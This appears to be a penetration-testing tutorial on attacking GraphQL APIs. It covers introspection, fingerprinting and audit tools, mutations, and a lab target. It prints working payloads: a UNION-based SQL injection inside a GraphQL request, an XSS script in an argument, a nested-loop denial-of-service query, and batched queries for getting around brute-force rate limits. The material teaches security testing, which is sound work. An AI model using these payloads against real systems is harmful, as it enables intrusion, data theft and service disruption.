[GraphQL](https://graphql.org/) is a query language typically used by web APIs as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the main benefits of using GraphQL over traditional REST APIs is efficiency in using resources and requests.
A GraphQL service typically runs on a single endpoint to receive queries. Most commonly, the endpoint is located at `/graphql`, `/api/graphql`, or something similar.

From an abstract point of view, GraphQL queries select `fields` of objects. Each object is of a specific `type` defined by the backend. The query is structured according to GraphQL syntax, with the name of the `query` to run at the root. For instance, we can query the `id`, `username`, and `role` fields of all `User` objects by running the `users` query:

```graphql
{
  users {
    id
    username
    role
  }
}
```
The resulting GraphQL response is structured in the same way and might look something like this:

```graphql
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "user1",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

If a query supports arguments, we can add a supported argument to filter the query results. For instance, if the query `users` supports the `username` argument, we can query a specific user by supplying their username:
```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```
## Identifying the GraphQL Engine
As a first step, we will identify the GraphQL engine used by the web application using the tool [graphw00f](https://github.com/dolevf/graphw00f). Graphw00f will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.
```shell
$ python3 main.py -d -f -t http://172.17.0.2
```
Additionally, it provides us with the corresponding detailed page in the [GraphQL-Threat-Matrix](https://github.com/nicholasaleks/graphql-threat-matrix), which provides more in-depth information about the identified GraphQL engine.
## Introspection

[Introspection](https://graphql.org/learn/introspection/) is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system. As such, users can use introspection queries to obtain all queries supported by the API schema. These introspection queries query the `__schema` field.
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```
The results contain basic default types, such as `Int` or `Boolean`, but also all custom types, such as `UserObject`. Now that we know a type, we can follow up and obtain the name of all of the type's fields with the following introspection query:
```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
Furthermore, we can obtain all the queries supported by the backend using this query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information. Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:

Code: graphql

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

The result of this query is quite large and complex. However, we can visualize the schema using the tool [GraphQL-Voyager](https://github.com/graphql-kit/graphql-voyager). We can also use [GraphQL Demo](https://graphql-kit.com/graphql-voyager/). However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.

## SQL Injection

Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. Therefore, we should carefully investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections
```
{"query":"{\n \tcustomerByName(apiKey:\"0711a879ed751e63330a78a4b195bbad\", lastName: \"Blair'\"){\n  \tfirstName\n    lastName\n    address\n\t}\n}","variables":null,"operationName":null}


{"query":"{\n \tcustomerByName(apiKey:\"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()-- -\"){\n  \tfirstName\n    lastName\n    address\n\t}\n}","variables":null,"operationName":null}


```

## Cross-Site Scripting (XSS)

XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization. Similar to the above SQL injection vulnerability, we should investigate any GraphQL arguments for potential XSS injection points.
XSS vulnerabilities can also occur if invalid arguments are reflected in error messages.
```graphql
{
	post(id: \"<script>alert(1)</script>\") {
		id
	}
}
```
```
"Argument \"id\" has invalid value \"<script>alert(1)</script>\".\nExpected type \"Int\", found \"<script>alert(1)</script>\"."
```

## Denial-of-Service (DoS) Attacks
To execute a DoS attack, we must identify a way to construct a query that results in a large response. We can abuse a loop if identified.
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```
This is an infinite loop we can repeat as many times as we want. If we take a look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query
## Batching Attacks
Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request.
```graphql
[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.
# Mutations
Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.
et us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:

Code: graphql

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Then we can query all fields of the identified objects with the following introspection query to obtain all fields we can use in the mutation:
```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```
Example:

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```
## Tools
## GraphQL-Cop

We can use the tool [GraphQL-Cop](https://github.com/dolevf/graphql-cop), a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the `graphql-cop.py` Python script:
```shell
$ python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql

[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
[HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
```

## InQL

[InQL](https://github.com/doyensec/inql) is a Burp extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.

Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax